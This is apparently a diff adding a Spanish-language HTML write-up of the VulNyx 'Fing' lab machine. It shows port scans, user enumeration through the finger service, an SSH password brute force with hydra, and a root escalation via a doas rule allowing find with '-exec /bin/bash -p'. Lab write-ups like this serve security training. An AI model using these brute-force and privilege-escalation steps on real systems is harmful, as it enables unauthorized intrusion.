@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>    
+    <meta property="og:title" content="✍ VulNyx - Fing " />
+    <meta property="og:description" content="🧠 Creador - D4t4s3c" />
+    <meta property="og:description" content="🟢 Nivel - Fácil" />
+    
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/fing" />
+    <meta property="og:url" content="https://0x-noname.github.io/writeups/nyx" /> 
+    
+    <meta property="og:image" content="https://0x-noname.github.io/assets/img/nyx_fing/logo.png" />
+    <meta property="og:type" content="website" />
+    <meta charset="UTF-8">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta property="twitter:image" content="https://0x-noname.github.io/assets/img/nyx_fing/logo.png" />
+    <meta property="twitter:title" content="VulNyx - Fing" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VulNyx - Fing</title>
+    <link rel="shortcut icon" href="../../assets/img/favicon.ico">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="../../assets/css/prism.css">
+    <link rel="stylesheet" href="../../assets/css/writeups_nyx.css">  
+</head>
+<body>
+    <header>
+        <nav class="nav">
+            <a href="../../index">$ home</a>
+            <a href="/#">$ whoami</a>
+        </nav>
+    </header>
+    <main class="main">
+        <h1>Red Team & Ctf Pl4yer</h1>
+        <h2>VulNyx - Fing</h2>
+            <p class="autor">Autor:&nbsp;<code class="code_autor_nyx">D4t4s3c</code></p>
+            <img class="img_nyx" src="../../assets/img/nyx_fing/logo.png" alt="logo">
+            <h3>Escaneo de puertos</h3>
+            <pre class="pre__nyx">
+<code class="code language-js">❯ nmap -p- -T5 -v -n 192.168.1.16
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+79/tcp open  finger
+80/tcp open  http
+</code></pre>
+            <h3>Escaneo de servicios</h3>
+<pre class="pre__nyx">
+<code class="language-js">❯ nmap -sVC -v -p 22,79,80 192.168.1.16
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f0e624fb9eb07a1abdf7b185237fb16f (RSA)
+|   256 99c87431451058b0cecc63b47a82573d (ECDSA)
+|_  256 60da3e3138fab549ab48c3432c9fd132 (ED25519)
+79/tcp open  finger  Linux fingerd
+|_finger: No one logged on.\x0D
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+|_http-server-header: Apache/2.4.56 (Debian)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Debian Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+            <h3>HTTP</h3>                
+            
+<pre class="pre__nyx">
+<code class="language-js">❯ whatweb -v 192.168.1.16
+WhatWeb report for http://192.168.1.16
+Status    : 200 OK
+Title     : Apache2 Debian Default Page: It works
+IP        : 192.168.1.15
+Country   : RESERVED, ZZ
+    
+Summary   : Apache[2.4.56], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)]
+</code></pre>
+            <p>Para enumerar el puerto 79 he usado esta herramienta en perl<code class="code_negrita">&nbsp;finger-user-enum.pl&nbsp;</code>y he encontrado estos dos usuarios.</p>
+<pre class="pre__nyx">
+<code class="language-js">❯ ./finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.1.16
+Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
+    
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+    
+Worker Processes ......... 5
+Usernames file ........... /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+Target count ............. 1
+Username count ........... 8295455
+Target TCP port .......... 79
+Query timeout ............ 5 secs
+Relay Server ............. Not used
+    
+######## Scan started at Sun Apr 23 16:58:20 #########
+root@192.168.1.16: Login: root    Name: root..Directory: /root         Shell: /bin/bash
+adam@192.168.1.16: Login: adam    Name: adam..Directory: /home/adam    Shell: /bin/bash
+</code></pre>
+
+            
+            <p>Con hydra realizo fuerza bruta al servicio<code class="code_negrita">&nbsp;SSH&nbsp;</code>con el usuario<code class="code_negrita">&nbsp;adam</code>.</p>
+<pre class="pre__nyx">
+<code class="language-js">hydra -t 50 -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.16 -V -f -I
+[22][ssh] host: 192.168.1.16   login: adam   password: passion
+</code></pre>
+            <p>Me conecto al sistema como usuario Adam.</p>
+<pre class="pre__nyx"><code class="language-js">❯ ssh adam@192.168.1.16
+adam@192.168.1.16's password:
+adam@fing:~$ id
+uid=1000(adam) gid=1000(adam) grupos=1000(adam)        
+</code></pre>
+
+            <p>Busco en todo el sistema los binarios que tengan permisos<code class="code_negrita">&nbsp;SUID&nbsp;</code>y encunetro el binario doas. El binario doas es una alternativa a sudo y se puede configurar para otorgar privilegios a usuarios específicos.</p>
+<pre class="pre__nyx"><code class="language-js">adam@fing:~$ find / -perm -4000 2>/dev/null
+/usr/bin/doas
+</code></pre>
+
+            <p>Busco el archivo<code class="code_negrita">&nbsp;doas.conf&nbsp;</code>que és el encargado de dar permisos a otros usuarios.</p>
+<pre class="pre__nyx"><code class="language-js">find / -type f -name "doas.conf" 2>/dev/null
+/etc/doas.conf
+</code></pre>
+            <p>El usuario adam puede usar doas con el usuario root, lanzar find con permisos de root y sin usar contraseña.</p>
+<pre class="pre__nyx"><code class="language-js">cat /etc/doas.conf
+permit nopass keepenv adam as root cmd /usr/bin/find
+</code></pre>
+
+            <p>Si uso doas con el usuario adam no puedo ver el directorio de root.</p>
+<pre class="pre__nyx"><code class="language-js">adam@fing:~$ doas -u adam /usr/bin/find /root
+doas: Operation not permitted
+</code></pre>
+
+            <p>Pero si uso doas con el usuario root si puedo ver el directorio de root.</p>
+<pre class="pre__nyx"><code class="language-js">adam@fing:~$ doas -u root /usr/bin/find /root
+/root
+/root/.profile
+/root/.bash_history
+/root/root.txt
+/root/.bashrc
+/root/.local
+/root/.local/share
+/root/.local/share/nano
+</code></pre>
+
+            <p>Para obtener el root he usado el recurso gtfobins.</p>
+<pre class="pre__nyx"><code class="language-txt">https://gtfobins.github.io/gtfobins/find/#suid
+</code></pre>
+
+
+        <p>Obtengo el root de la siguiente forma.</p>
+<pre class="pre__nyx"><code class="language-js">adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/bash -p \; -quit
+root@fing:/home/adam# id
+uid=0(root) gid=0(root) grupos=0(root)
+</code></pre>
+
+            <p>Y con esto ya tenemos resulta la máquina Fing del sr D4t4s3c, Saludos!</p>
+
+    </main>
+        <footer class="footer">
+            <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
+            <script src="../../assets/js/prism.js"></script> 
+
+        </footer>  
+</body>
+</html>
